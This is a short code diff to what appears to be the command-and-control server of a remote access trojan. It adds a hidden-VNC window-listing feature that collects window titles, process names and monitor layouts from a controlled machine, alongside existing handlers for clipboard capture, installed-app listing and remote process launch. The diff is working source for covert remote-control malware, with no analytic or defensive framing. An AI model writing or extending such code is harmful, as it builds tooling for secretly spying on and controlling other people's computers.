@@ -806,6 +806,47 @@ export function handleHVNCBrowserLaunchStatus(clientId: string, payload: any) {
   }
 }
 
+export function handleHVNCWindowListResult(clientId: string, payload: any) {
+  const windows: Array<{
+    title: string; x: number; y: number; width: number; height: number;
+    pid: number; processName: string; monitor: number;
+  }> = [];
+  if (Array.isArray(payload.windows)) {
+    for (const w of payload.windows) {
+      windows.push({
+        title: String(w.title || ""),
+        x: Number(w.x) || 0,
+        y: Number(w.y) || 0,
+        width: Number(w.width) || 0,
+        height: Number(w.height) || 0,
+        pid: Number(w.pid) || 0,
+        processName: String(w.processName || ""),
+        monitor: Number(w.monitor ?? -1),
+      });
+    }
+  }
+  const monitors: Array<{
+    index: number; name: string; x: number; y: number;
+    width: number; height: number; primary: boolean;
+  }> = [];
+  if (Array.isArray(payload.monitors)) {
+    for (const m of payload.monitors) {
+      monitors.push({
+        index: Number(m.index) || 0,
+        name: String(m.name || ""),
+        x: Number(m.x) || 0,
+        y: Number(m.y) || 0,
+        width: Number(m.width) || 0,
+        height: Number(m.height) || 0,
+        primary: !!m.primary,
+      });
+    }
+  }
+  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
+    safeSendViewer(session.viewer, { type: "hvnc_window_list_result", windows, monitors });
+  }
+}
+
 export function handleClipboardContent(clientId: string, payload: any) {
   const text = String(payload.text || "");
   const source = String(payload.source || "");
@@ -1091,6 +1132,9 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
       break;
     case "hvnc_installed_apps":
       sendHVNCCommand(target, "hvnc_installed_apps", {});
+      break;
+    case "hvnc_window_list":
+      sendHVNCCommand(target, "hvnc_window_list", {});
       break;
     case "hvnc_start_process":
       sendHVNCCommand(target, "hvnc_start_process", {
